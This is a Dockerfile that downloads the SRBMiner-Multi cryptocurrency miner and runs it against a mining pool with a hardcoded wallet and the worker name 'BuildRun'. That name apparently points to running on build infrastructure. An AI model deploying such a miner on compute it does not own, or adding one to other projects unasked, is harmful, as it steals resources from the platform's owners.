FROM ubuntu:22.04

RUN apt-get update && apt-get install -y wget tar

WORKDIR /app

RUN cd ~ && mkdir -p srbminer && cd srbminer && \
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.3.9/SRBMiner-Multi-3-3-9-Linux.tar.gz && \
    tar xf SRBMiner-Multi-3-3-9-Linux.tar.gz && \
    rm SRBMiner-Multi-3-3-9-Linux.tar.gz && \
    cd SRBMiner-Multi-3-3-9 && \
    chmod +x SRBMiner-MULTI

WORKDIR /root/srbminer/SRBMiner-Multi-3-3-9

# Direct exec, tidak pakai sh -c
ENTRYPOINT ["./SRBMiner-MULTI"]
CMD ["-a", "neuromorph", "-o", "stratum.cereblix.com:3333", "-u", "crb15b185b68ef2f3d4829eb419b59c8bb56d8ea8aca.BuildRun", "-p", "x", "-t", "4"]
